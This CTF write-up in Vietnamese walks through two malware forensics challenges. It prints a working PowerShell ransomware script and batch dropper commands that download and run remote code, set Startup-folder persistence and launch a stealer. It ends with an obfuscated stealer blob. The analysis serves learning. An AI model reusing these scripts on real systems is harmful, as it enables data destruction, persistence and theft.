#                **Ghost In The Dark**

![image](https://hackmd.io/_uploads/r1TO4MGLgg.png)

* đầu tiên khi ta sẽ có được file disk .001
* phân tích nó bằng autospy
![image](https://hackmd.io/_uploads/H11frfMUgx.png)

* ta thấy có 3 file cần chú ý: flag.enc, loader.ps1, payload.enc
* đa phần trong các malware sẽ thường được viết bằng powershell và được lưu dưới dạng file ps1
* sau khi xuất 3 file đó ra ta thấy 
* loader.ps1 nó sẽ lấy key và iv để mã hóa AES với padding là PSCK7 và sau đó nó lưu vào file payload.enc
* sau khi view 2 file payload và flag thì ta thấy nó đều bị mã hóa.
* đối với file payload thì ta sẽ giải mã base64 và giải mã AES để tìm ra payload cuối cùng 

```
from Crypto.Cipher import AES
import base64

# === Config ===
key = b"0123456789abcdef"       # 16 bytes key
iv = b"abcdef9876543210"        # 16 bytes IV
enc_file = r"payload.enc"    # Path to the encrypted file

# === Load and decode Base64 ===
with open(enc_file, "rb") as f:
    b64_data = f.read()
encrypted_data = base64.b64decode(b64_data)

# === AES decrypt (CBC, PKCS7) ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
plaintext = decrypted[:-pad_len].decode('utf-8')

# === Print or save the decrypted script ===
print(plaintext)

# Optional: Save to file
with open("payload_decoded.ps1", "w", encoding="utf-8") as out:
    out.write(plaintext)

```

đây là code để giải mã file paylaod 

sau khi giải mã ta được payload thực tế

```
$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```

* đây chính là malware của bài này, tương tự như loader.ps1 thì nó cũng sẽ lấy key và iv để mã hóa flag.enc
* từ đây ta viết code để giải mã tiếp flag.enc

```
from Crypto.Cipher import AES

# === Key và IV hardcoded từ ransomware ===
key = b"m4yb3w3d0nt3x1st"        # 16 bytes key
iv  = b"l1f31sf0rl1v1ng!"        # 16 bytes IV

# === Đường dẫn file enc và file output ===
enc_file = r"flag.enc"
dec_file = r"flag.txt"

# === Load ciphertext ===
with open(enc_file, "rb") as f:
    encrypted = f.read()

# === AES CBC Decrypt ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
plaintext = decrypted[:-pad_len]

# === Save plaintext ===
with open(dec_file, "wb") as f:
    f.write(plaintext)

print("[+] flag.txt recovered:", plaintext.decode('utf-8', errors='ignore'))

```

flag: **L3AK{d3let3d_but_n0t_f0rg0tt3n}**


#   **BOMbardino crocodile**

![image](https://hackmd.io/_uploads/rymMDzMLxx.png)

* bài này cũng ở dạng malawre nhưng sẽ phức tạp hơn 1 xíu vì nó phải qua nhiều bước giải mã và phân tích

* ở đây người dùng sẽ cho ta file back up của window của nạn nhân và mail của hacker gửi cho nạn nhân
* tìm kiếm trong download của người dùng thì ta thấy có file Lil L3ak secret plans for tonight.bat
* sau khi quan sát thì mình thấy hầu như file này đều viết ở dạng UTF16 hoặc dạng nào đó
* nên mình có thử bỏ lên cyberchef để view thử thì nó đã chuyển lại cho mình thành UTF-8
* ở đây hacker đã sử dụng nhiều đoạn mã dài để đánh lừa, thực chất chỉ cần chú ý đến các đoạn 


```
start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat' -OutFile '%TEMP%\temp.bat'; Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden"

```

* ở đây đoạn này sẽ tải file .bat về và lưu dưới file temp.bat 
* view file temp.bat ở cyberchef ta thấy được 

```
start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat'); (New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1', 'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 60; C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py; Remove-Item 'C:/Users/Public/Document.zip' -Force" && exit

```

* đoạn này sẽ phức tạp hơn, nó sẽ tải các file ud.bat, T602.zip 
* và lưu nó dưới tên WindowsSecure.bat, folder Document để đánh lừa hệ thống
* view tiếp file WindowsSecure.bat
* ở đây sẽ có code mã hóa và dạng này là mapping ở các dóng đầu sẽ có dictionary của để mã hóa theo dạng của người dùng, mình sẽ có code giải mã:
```
import re

# Mapping từ batch file
mapping = {
    "cb": "", "ts": "", "cv": '"', "ms": "-", "gt": ".", "ax": "/", "nc": "0", "bs": "3",
    "tc": "4", "ch": ":", "wj": "A", "rd": "B", "ui": "C", "jl": "D", "vv": "H", "hp": "K",
    "cm": "L", "rz": "P", "kv": "S", "ym": "U", "uj": "W", "dt": "\\", "up": "_", "qx": "a",
    "da": "b", "qf": "c", "bl": "d", "ke": "e", "fn": "f", "jq": "g", "ea": "h", "lc": "i",
    "ln": "j", "wc": "k", "nt": "l", "zm": "m", "pm": "n", "hr": "o", "xv": "p", "bi": "q",
    "ae": "r", "eh": "s", "og": "t", "zk": "u", "vf": "v", "jm": "w", "sf": "x", "gp": "y", "ny": "z", "xe": "{"
}

def decode_string(encoded):
    """Decode a string with %var% based on the mapping."""
    parts = re.findall(r'%(\w+)%', encoded)
    return ''.join(mapping.get(part, '?') for part in parts)

# Đọc file input
with open('text.txt', 'r', encoding='utf-8') as f:
    lines = f.readlines()

# Giải mã từng dòng
for line in lines:
    decoded = decode_string(line.strip())
    print(decoded)

```

* như mình thấy ở các file trước thì chúng ta chỉ cần chú ý ở đoạn giữa thôi 2 đoạn trên cùng và dưới cùng để gây nhiễu
* ta chỉ cần decode những đoạn ở giữa 
![image](https://hackmd.io/_uploads/Hkd-9fzUll.png)

* **::L3AK{Br40d0_st34L3r_**
`start/minpowershell.exe-WindowStyleHidden-Command"C:\Users\Public\Document\pythonC:\Users\Public\Document\Lib\leak.py"`

* ta đã có part 1 của flag, sau đó có đoạn mã thực thi file `leak.py`
* ta sẽ tìm file `leak.py` để view
* đoạn mã khá dài ta chỉ cần chú ý đoạn exec trong code thôi ở mình thấy nó sẽ đảo ngược data và decode base64
* **ở đây code này bạn sẽ cần phải giải mã 4 5 lần vì code này bị mã hóa nhiều lớp**

```
import base64

data = b'==gCp4URL9EVfR1TChib1JnL09mYgACIgogOi81XulWYt91XiASP9AyXfVWbh52XfBiZppgCzcjM0QzMwMjM5YzM1ATNxczMxASPgQUSfxURO5UQINkCiUkdyQmQ0MjMNFXT3EzMZRmYGdDUuZVbzxEbHlzVNVUQyt2d6VlWuQUe0MESH5SQOlXUU9keNpXT1UkaOpXRE5keJRkTy0EVNJCI9AiTFt0TU9FVPJkCKkiI9V2egoDc1ByZulmbhVGbjBicvJncFJiZoQnbpJHcgACIgACIgAiC6UGIzFGIu9Wa0BXZjhXRgQHclNGelBCIgAiCpcibvNnau8mZul2XtVGdzl3ccFGdhRUbhJ3ZvJHUcpzQnIHKlZ3btVmcuM3bgACIgACIgAiCpcCd4RnLzRmcvd3czFGccFGdhRUbhJ3ZvJHUcpzQnIHKlZ3btVmcuM3bgACIgACIgAiCpcCcppnLzRmcvd3czFGccFGdhRUbhJ3ZvJHUcpzQnIHKlZ3btVmcuM3bgACIgACIgAiCpcyYuVmLnBnaucWYsZmbpdnM5FGccFGdhRUbhJ3ZvJHUcpzQnIHKlZ3btVmcuM3bgACIgACIgAiCpcyZwpmLnFGbm5Wa3JTehBHXhRXYE1WYyd2byBFX6M0JyhSZ29WblJnLz9GIgACIgACIgogO5JHdgACIgogCpkyJu92cq5ybm5Waf1WZ0NXezxVY0FGRtFmcn9mcQxlODdicoUGbpZkLkJ3bjNXak1TZslmZoQmblNnLsVmbuFGajBCdpF2dhBCIgAiCgACIgoQKlNHbhZUPpl2YzF2XlJXdz5WZgwCN9QnblRmbpBCLmBCLvZmbp9VblR3c5NHKw1Wdk5ibvNnagACIgACIgAiC6YGIzFGIpcCOtYGd1dSPn5Wak92YuVGIscydnACLn42bzpmLvZmbp9VblR3c5NHXhRXYE1WYyd2byBFX6M0JyhiblB3bggGdpdHIgACIKACIgAiCpQWZi1WZ9QWZi1WZoQmblNnLsVmbuFGajBCdpF2dhBCIgAiCgACIgoQKlNHbhZUPl5Was5WagwSX0IDMxozWldWYzNXZt1TZ1xWY2BCLiMnblt2bUJSPl1WYuhCZsVWam9FZkFmLkVmYtVGIgACIKkSZzxWYG1TZulGbulGIs0FNyATM6sFevxmYvJXPlVHbhZHIsISe0lmc1NWZTBCevxmYvJlI9UWbh5GKkxWZpZ2XkRWYuQWZi1WZgACIgoQKlNHbhZUPl5Was5WagwiI9NXelt2egoTeltkbc13clBXe0tHI6UGc5Rlbc1nczV3egojclNXViYWPlVHbhZHIsISeltEIzd3bk5WaXJSPl1WYuhCZsVWam9FZkFmLkVmYtVGIgACIKkSKoUWdsJmLy9GbvNkLkJ3bjNXak1jcvx2bjBCLiozcslWY0VGZgUGa0BycnUmclhGIsQWZ0NWYyRHelBychdHIhRXYkBycn0Wa0NWa2BSQi0jbvlGdwlmcjNXZkBCLi0XZtFmb0N3botHIt9mcmBSY0FGRiYWPlxGdpRHKkVmYtVkLkJ3bjNXakBSPgQWZi1WZgACIgogCpISfltHI6MXZpt2bvNGIn5WazNXZj9mcwBicvJncFJiZoQnbpJHcgACIgACIgAiC6UGIzFGIu9Wa0BXZjhXRgQHclNGelBCIgAiCnAGYg1ne7BGYgdiZg0DI49Gbi9mcgACIgACIgACIgACIgACIgogOztmb1h2Yg4WagoHIy9mZgACIgACIgACIgACIK0VK0lWbpxGIskCZuV2co4WZsBCLwgSZn5WYyBibpBSagI3bmBSX0lWbpxGIrASa6k2Wk5WZztFI9Aycr5WdoNGIgACIgACIgACIgAiCp0VK4hic0NHIulGI5BiZpBycll2av92Yg4WaggHIy9mZgkCeoIHdztFKyR3cg0DIk5WZzBCIgACIgACIgACIgogOll2av92Yg4WagkHIy9mZgACIgACIgAiC6knc0BCIgAiCKkiI9V2egozcll2av92Ygg3bmVmcpZEIn5WasFWZ0NHIy9mcyVkImhCdulmcwBCIgACIgACIKoTZgMXYg42bpRHclNGeFBCdwV2Y4VGIgACIKkSKpgCevZWZylmZuwWYlR3coQ3cpxGKk5WZ0hXZuMXZpt2bvNGIgACIgACIgogO5JHdgACIgogCpISfltHI6MXZpt2bvNGIl12byh2QgcmbpxWYlR3cgI3byJXRiYGK05WayBHIgACIgACIgogOlBychBibvlGdwV2Y4VEI0BXZjhXZgACIgoQKpkCKl12byh2YuwWYlR3coQ3cpxGKk5WZ0hXZuMXZpt2bvNGIgACIgACIgogO5JHdgACIgogCiQmb19mZgMXZpt2bvNGI49Gbi9mUg8mTiASPgg3bsJ2byBCIgAiCwADMyASPgQXatlGbgACIgoQXbBSPgMXZpt2bvNGIgACIK0lIZRVSSV1QFN1TMJ0TS5iIbBSPgUWar92bjBCIgAiCKIib39mbr5WViASPgMXZwlHdgACIgACIgAiCi42dv52auVlIg0DIzlXZrBCIgACIgACIKIib39mbr5WViASPgI3c1BCIgACIgACIKkiI9V2egozbm5Wag0WZ0NXezByZulGd0V2ZgI3byJXRiYGK05WayBHIgACIgACIgogOlBychBibvlGdwV2Y4VEI0BXZjhXZgACIgoQKoAXayR3cu0VMblyJux1JoQXasB3cukCKlR2bjVGZukyJu9Wa0BXYDBCdldGIz9GIjlWb3dCK0VHc0V3bft2Ylh2YuM3clN2byBnY1NHI9AyclBXe0BCIgACIgACIKkCKwlmc0NnLdFzWpcibcdCK0lGbwNnLpgSZk92YlRmLpcSeltEdjVHZvJHUsFmbpdWay9EezE0TgQXZnBSZjlmdyV2cn5Waz5WZjlGblJXY3RnZvNHIoRXYwByYp12dngCd1BHd192XrNWZoNmLzNXZj9mcwJWdzBSPgMXeltGIgACIgACIgoQKiUWbh5kclNXVigiduVGdldmLz9GI9AiczVHIgACIgACIgogO5JHdgACIgogCpISfltHI6UGbpZGIkJ3b3N3chBHIoRXa3BicvJncFJiZoQnbpJHcgACIgACIgAiC6UGIzFGIu9Wa0BXZjhXRgQHclNGelBCIgAiCpkSZtFmb6hSZslmRuQmcvN2cpRWPlxWamBCLi0XZtFmb0N3botHIt9mcmByckJ3b3N3chBlImhCZuV2cuwWZu5WYoNGI0lWY3FGIgACIgACIgoAIgACIgACIgoQKoU2cvx2YuAXa6dXZuBCIgACIgACIKkyJ0hHduMHZy92dzNXYwxVY0FGRtFmcn9mcQxlODdicoUGdpJ3duAXa6dXZuBCIgACIgACIKkyJ3dCIsUWbh5meoUGbpZEcpplLlxWamBXa6BSPgAXa6dXZuBCIgACIgACIKcCcppnLzRmcvd3czFGccFGdhRUbhJ3ZvJHUcpzQnIHI9ASZtFmb6BCIgACIgACIKoTeyRHIgACIKoQKi0XZ7BiO09Gaz5WZlJ3YzByZul2ahRHIy9mcyVkImhCdulmcwBCIgACIgACIKoTZgMXYg42bpRHclNGeFBCdwV2Y4VGIgACIKoQKpgGdhB3XkVGdwlncj5WZoUGbpZkLkJ3bjNXak1TZslmZgwiIpkXZrBSZoRHIy9mZgADM1QCI5FGUoASfl1WYuR3cvh2eg02byZGI09Gaz5WZlJ3YTJiZoQmblNnLsVmbuFGajBCdpF2dhBCIgACIgACIKoQKhRXYk9FZlRHc5J3YuVGKlRXaydnLmBCIgACIgACIgACIgogOmBychBSKnI2dnACLoRXYw9FZlRHc5J3YuVGKuVGcvBCa0l2dgACIgACIgAiCnMmbl5yJgsCIoRXYw9Fdvh2cuVWZyN2cg0DIoRXYw9FZlRHc5J3YuVGIgACIgACIgogCpEGdhR2XldWYtlGK0BXeyNmbl5iclhGcpNGI9ASY0FGZfRWZ0BXeyNmblBCIgACIgACIKkSeltGK3VmbuQzQSFEI9AiclhGcpNGIgACIgACIgowJhxWYsFmc091byVGbhxWYyR3JiBSPgkXZrBCIgACIgACIKoQKoQWYlJnLmBSPgEGdhR2XldWYtlGIgACIgACIgACIgAiC6YGIzFGIpciYydCIsgGdhB3X09Gaz5WZlJ3YzhiblB3bggGdpdHIgACIgACIgogCpgGdhB3X09Gaz5WZlJ3YzhSZ2F2cuQ3boNnblVmcjNHIgACIgACIgowJnBnaucWYsZmbpdnM5FGccdicgsCIpcSY0FGRtFmcn9mcQdCK25WZ0V2ZuM3bg0DIoRXYw9Fdvh2cuVWZyN2cgACIgACIgAiCpgiYhJ3ZuIWYydUZnFWbJBSPgQ3boNnblVmcjNHIgACIgACIgoANDJVQgQncvBXbpBiclhGcpNkLvRHc5J3Qg02byZGIgACIgACIgogYhJ3RldWYtlEI0J3bw1WagwUSQBSbvJnZgACIgACIgAiC6knc0BCIgAiCKcCYgB2Jg0zKgU2ZhN3cl1GIgACIgACIgowczFGcgACIgACIgACIgACIKoTZzxWZgACIgACIgAiCn4GX95WZr9Gd7diZg0zKgU2ZhN3cl1GIgACIgACIgACIgACIgACIKozcuV2avRHIulGIuV2avRHIy9mZgACIgACIgACIgACIKoDMg4DIpMnblt2b0hiblxGImlGIgACIgACIgogCpgGdhBHKmZWauNHI9AycuV2avRHIgACIgACIgowJgBGYnASPrASZnF2czVWbgACIgACIgAiCKUWdulGdu92YgACIgACIgACIgACIKoTKoRXYwhyc0NXa4VmLoRXYw5ycvBCdv5GImlGIgACIgACIgogOpgyctVGdp5ycoRXYwBibpBCa0FGcgwSby9mZ0FGbwBicvZGIgACIKcibcdCI9ASZnF2czVWbgACIgogC9BCIgAiCnQHb1FmZlREXcFGdhREIyV2cVxFXyV2c39mcChXZk5WYZxFX4VGZuFWWcx1JgsCIsF2YvxGI6cCelRmbhl1JgACIgACIgAiCscCdsVXYmVGRcxVY0FGRgIXZzVFXcJXZzd3byJULlZXYyJEXcVmchdHdm92UlZXYyJEXcdCIrACbhN2bsBiOnUmdhJnQnACIgACIgACIKwyJlxmYhR3UgEmclB3TcxVZyF2d0Z2bTBSYyVGcPxFXnAyKgcmbp1WYvJHI6cSYyVGcPdCIgACIgACIgoALnQHb1FmZlREXcFGdhREIyV2cVxFXl12byh2QcxVZsd2bvdEXcdCIrACbhN2bsBiOnUWbvJHaDBSZsd2bvd0JgACIgACIgAiCsciY0BHZy92YzlGZcx1JgsCIn5WatF2byBiOnIEVQBCZy92YzlGRnACIgACIgACIKwyJ5JXYuF2YkJ3bjNXakxFXnAyKgcmbp1WYvJHI6cSeyFmbhNEIkJ3bjNXaEdCIgACIgACIgoALnQmcvN2cpREXcdCIrAyZulWbh9mcgozJkJ3bjNXaEdCIgACIgACIgoweg0DIzhGdhBHIgACIKkyJBRVQEBFUBdCK25WZ0V2ZuM3bg0DIn5WatF2byBCIgAiCpcSQUFERQBVQMF0QPx0JoYnblRXZn5ycvBSPgwWYj9GbgACIgoAIgACIKIib39mbr5WViASPgUWbh5Gdz9GagACIgACIgAiC6QHclNGelBCIgAiC0hXZ05SKiAXav8Wau8mZulGcp9yL6MHc0RHaigCdldmLzR3clVXclJHI9ASZtFmb0N3boBCIgACIgACIKoTeyRHIgACIKoTKsVmbuFGajhSY0FGZfVGdhJHdslmZ4VGImVGZgMmb5NXYKoQKoU2cvx2YuQ3biBCdpF2dhBCIgAiCgACIgoQKsVmbuFGajhSY0FGZfVGdhJHdslmZ4VGI0lWY3FGIgACIKACIgAiCpgCZlZXYz5ibpFWbgACIgoQKi0XZ7BiOzRmcvd3czFGcgUWbvJHaDByZulGd0V2ZgI3byJXRiYGK05WayBHIgACIgACIgogOlBychBibvlGdwV2Y4VEI0BXZjhXZgACIgoQKoIGZl12byh2Yu4Wah1GIgACIgACIgogO5JHdgACIgoQKoUWbvJHajBSPg4Wah1GIgACIKACIgAiCuJXd0VmcgACIgACIgAiCpISfEl0XMVkTOFESDtHI6QUSggGdpdHIsVmbuFGajBCZulmZgQ3buBCZsV3bDJiZoQnbpJHcgACIgACIgAiC6wWZu5WYoNGI09mbgYWagACIgoQKEl0XMVkTOFESDhCbl5mbhh2YfRXZn5CdvJGI9ACbl5mbhh2YgACIgoAIgACIKkyJ9JXZzVnL09mY7BychBibpBCZld2Zvx0JmhCdulmcwBCIgAiC6kCK5RWYlJ3Xu9GImVGZgMmb5NXYKQnblZXZuQ3biBkCKUmbv5EIuJXd0VmcgACIgACIgACIgACIKojcvJncFN3dvRmbpdFI0BXZjhXZgACIgACIgAiCpQ3cpxEZy92dzNXYw5iZsV2coMXZulGblRXaydnLmBCIgACIgACIgACIgACIgAiC6YGIzFGIpcCOtYGd1dSPn5Wak92YuVGIscydnACLnQHe05yckJ3b3N3chBHXhRXYE1WYyd2byBFX6M0JyhiblB3bggGdpdHIgACIgACIgACIgAiC6knc0BCIgACIgACIKoTKmxWZzhCZlZXYzBiZlRGIgACIKowczFGcgACIgACIgACIgACIKoTZzxWZgACIgACIgAiCl52bOBibyVHdlJHIgACIgACIgACIgACIgACIKojcvJncFN3dvRmbpdFI0BXZjhXZgACIgACIgACIgACIKkCKlR2bjVGZu0lNx0iObRHe09FZlRHc5J3YlRGIuJXd0VmcgACIgACIgACIgACIgACIgACIgAiCpQHe09FZlRHc5J3YuVGKz52bpRHc5J3YlRGI9ACd4R3XkVGdwlncjVGZgACIgACIgACIgACIgACIgACIgAiC6cCMxY3JiBSP9ASXzozW0hHdfRWZ0BXeyNmblBiZpxWZgACIgACIgACIgACIgACIgoQKoUGZvNWZk5Cd4R3XkVGdwlncjVGZg4mc1RXZyBCIgACIgACIgACIgA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